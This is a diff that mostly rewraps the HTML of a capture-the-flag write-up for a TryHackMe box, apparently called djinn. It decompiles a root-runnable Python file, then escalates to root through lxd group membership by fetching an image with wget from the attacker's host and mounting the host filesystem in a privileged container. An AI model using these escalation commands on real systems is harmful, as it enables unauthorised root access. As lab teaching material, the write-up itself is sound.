-<p>We can decompile the pyc file using <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj8kouwnrjqAhUi7XMBHXczBBAQFjAAegQIAhAB&amp;url=https%3A%2F%2Fpypi.org%2Fproject%2Funcompyle6%2F&amp;usg=AOvVaw0K90ryNJluPxJukPv2rzBo">uncompyle6</a></p>
-<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">uncompyle6</span> program.pyc <span class="op">&gt;</span> program.py</span></code></pre></div>
+<p>We can decompile the pyc file using <a
+href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj8kouwnrjqAhUi7XMBHXczBBAQFjAAegQIAhAB&amp;url=https%3A%2F%2Fpypi.org%2Fproject%2Funcompyle6%2F&amp;usg=AOvVaw0K90ryNJluPxJukPv2rzBo">uncompyle6</a></p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">uncompyle6</span> program.pyc <span class="op">&gt;</span> program.py</span></code></pre></div>
 <p>The decompiled program is as follows:</p>
-<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co"># uncompyle6 version 3.7.2</span></span>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co"># uncompyle6 version 3.7.2</span></span>
 <span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Python bytecode 2.7 (62211)</span></span>
 <span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Decompiled from: Python 3.8.3 (default, May 17 2020, 18:15:42)</span></span>
 <span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="co"># [GCC 10.1.0]</span></span>
@@ -298,32 +370,55 @@ And don&#39;t mess up anything.</code></pre></li>
 <span id="cb24-54"><a href="#cb24-54" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
 <span id="cb24-55"><a href="#cb24-55" aria-hidden="true" tabindex="-1"></a>    main(options())</span>
 <span id="cb24-56"><a href="#cb24-56" aria-hidden="true" tabindex="-1"></a><span class="co"># okay decompiling lago.pyc</span></span></code></pre></div>
-<p>So this is the source of the /root/lago file that we have the run permissions for. Analyzing the source, we see that the number supplied is comapared with a number generated randomly. Anyway, randomly trying to enter the word “num” as the number, we succeed! Couldn’t figure out why that happened though. Will update as soon as I figure it out.</p>
+<p>So this is the source of the /root/lago file that we have the run
+permissions for. Analyzing the source, we see that the number supplied
+is comapared with a number generated randomly. Anyway, randomly trying
+to enter the word “num” as the number, we succeed! Couldn’t figure out
+why that happened though. Will update as soon as I figure it out.</p>
 <p><img src="/img/tryhackme_djinn/13.png" /></p>
-<h2 id="second-cooler-way-lxc-container">Second (Cooler) way : lxc container</h2>
-<p>Looking at the box a bit more, I had a look at the group memberships of the the user sam and found that the user is a member of the group <code>lxd</code> !</p>
-<p>We can privesc a member of the group to root easily using this. This method has been explained really well in <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">hackingarticles</a></p>
-<p>So we download and build the alpine linux image on our host as follows:</p>
-<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone  https://github.com/saghul/lxd-alpine-builder.git</span>
+<h2 id="second-cooler-way-lxc-container">Second (Cooler) way : lxc
+container</h2>
+<p>Looking at the box a bit more, I had a look at the group memberships
+of the the user sam and found that the user is a member of the group
+<code>lxd</code> !</p>
+<p>We can privesc a member of the group to root easily using this. This
+method has been explained really well in <a
+href="https://www.hackingarticles.in/lxd-privilege-escalation/">hackingarticles</a></p>
+<p>So we download and build the alpine linux image on our host as
+follows:</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone  https://github.com/saghul/lxd-alpine-builder.git</span>
 <span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> lxd-alpine-builder</span>
 <span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">./build-alpine</span></span></code></pre></div>
-<p>We get the build image <code>alpine-v3.12-x86_64-20200706_0859.tar.gz</code>. Now we need to transfer this file to the target machine. So lets fire up a python http server</p>
-<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server</span></code></pre></div>
+<p>We get the build image
+<code>alpine-v3.12-x86_64-20200706_0859.tar.gz</code>. Now we need to
+transfer this file to the target machine. So lets fire up a python http
+server</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server</span></code></pre></div>
 <p>On the target, we download the build lxc image</p>
-<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://10.9.17.253:8000/alpine-v3.12-x86_64-20200706_0859.tar.gz</span></code></pre></div>
+<div class="sourceCode" id="cb27"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://10.9.17.253:8000/alpine-v3.12-x86_64-20200706_0859.tar.gz</span></code></pre></div>
 <p>Now let’s add this image to the lxd list</p>
-<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz <span class="at">--alias</span> pwn</span></code></pre></div>
-<p>We got a permission denied saying that we cannot write to /home/nitish/.config. So our home directory is not right. So we run the following</p>
-<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">HOME=</span>/home/sam</span>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz <span class="at">--alias</span> pwn</span></code></pre></div>
+<p>We got a permission denied saying that we cannot write to
+/home/nitish/.config. So our home directory is not right. So we run the
+following</p>
+<div class="sourceCode" id="cb29"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">HOME</span><span class="op">=</span>/home/sam</span>
 <span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image import ./alpine-v3.12-x86_64-20200706_0859.tar.gz <span class="at">--alias</span> pwn</span>
 <span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> image list</span></code></pre></div>
 <p>And now we succeed.</p>
 <p><img src="/img/tryhackme_djinn/14.png" /></p>
-<p>Now we run the following to get root. We also need to create a storage additionaly here as follows.</p>
-<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> storage create my-storage dir</span>
+<p>Now we run the following to get root. We also need to create a
+storage additionaly here as follows.</p>
+<div class="sourceCode" id="cb30"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> storage create my-storage dir</span>
 <span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> profile device add default root disk path=/ pool=my-storage</span></code></pre></div>
 <p>Then</p>
-<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> init pwn ignite <span class="at">-c</span> security.privileged=true</span>
+<div class="sourceCode" id="cb31"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> init pwn ignite <span class="at">-c</span> security.privileged=true</span>
 <span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> config device add ignite mydevice disk source=/ path=/mnt/root <span class="dt">\</span></span>
 <span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>recursive=true</span>
 <span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="ex">lxc</span> start ignite</span>
@@ -331,7 +426,8 @@ And don&#39;t mess up anything.</code></pre></li>
 <span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span></code></pre></div>
 <p>And we got root!</p>
 <p><img src="/img/tryhackme_djinn/15.png" /></p>
-<p>In order to get the root flag, we go to <code>/mnt/root/root</code> and find an executable proof.sh, we run it to get our flag.</p>
+<p>In order to get the root flag, we go to <code>/mnt/root/root</code>
+and find an executable proof.sh, we run it to get our flag.</p>
 <p><img src="/img/tryhackme_djinn/16.png" /></p>
 </article>
 
